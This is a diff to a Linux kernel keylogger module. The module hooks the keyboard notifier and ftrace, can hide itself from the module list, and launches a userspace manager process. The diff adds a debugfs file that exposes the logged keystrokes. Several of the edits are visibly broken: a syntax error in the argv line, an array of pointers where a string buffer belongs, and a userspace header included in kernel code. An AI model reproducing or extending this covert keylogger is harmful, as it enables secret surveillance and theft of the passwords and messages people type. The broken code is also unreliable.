@@ -18,6 +18,7 @@
 #include <linux/kallsyms.h>
 #include <linux/dirent.h>
 #include <linux/version.h>
+#include <strings.h>
 
 #ifdef HIDE_MODULE
 #include <linux/list.h>
@@ -33,8 +34,11 @@ MODULE_LICENSE("GPL");
 
 #define DEVICE_NAME "kl0"
 unsigned major;
+char* major_string[10];
 
 static char* target_process = "/etc/keylog/manager.o";
+static struct dentry *file;
+static struct dentry *subdir;
 
 #ifndef BUFLEN
 #define BUFLEN 1024
@@ -583,15 +587,12 @@ static struct ftrace_hook hooks[] = {
 static int spawnProcess(char* path) {
 
     int rc;
-    char major_string[10];
-	char* argv[] = {path, "", NULL};
+	char* argv[] = {path, itoa() NULL};
 	static char* envp[] = {
 		"HOME=/",
 		"TERM=linux",
 		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-    sprintf(major_string, "%d", major);
-    argv[1] = major_string;
-
+    
 	rc = call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
 	printk("RC is: %i \n", rc);
 	return rc;
@@ -602,6 +603,17 @@ static int __init kl_init(void)
 	int i;
 	int err;
 	int ret;
+    subdir = debugfs_create_dir("keylog", NULL);
+	if (IS_ERR(subdir))
+		return PTR_ERR(subdir);
+	if (!subdir)
+		return -ENOENT;
+
+	file = debugfs_create_file("log", 0400, subdir, NULL, &keys_fops);
+	if (!file) {
+		debugfs_remove_recursive(subdir);
+		return -ENOENT;
+	}
 	ret = register_chrdev(0, DEVICE_NAME, &fops);
 	if (ret < 0) {
 		printk(KERN_ERR
@@ -609,6 +621,7 @@ static int __init kl_init(void)
 		return ret;
 	}
 	major = ret;
+    pr_debug("%d", major);
 	printk(KERN_INFO "keylog: Registered device major number %u\n", major);
 	protect_memory();
 	ret = register_keyboard_notifier(&kl_notifier_block);
@@ -641,6 +654,7 @@ static void __exit kl_exit(void)
 	unregister_keyboard_notifier(&kl_notifier_block);
 	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	unprotect_memory();
+    debugfs_remove_recursive(subdir);
 }
 
 module_init(kl_init);
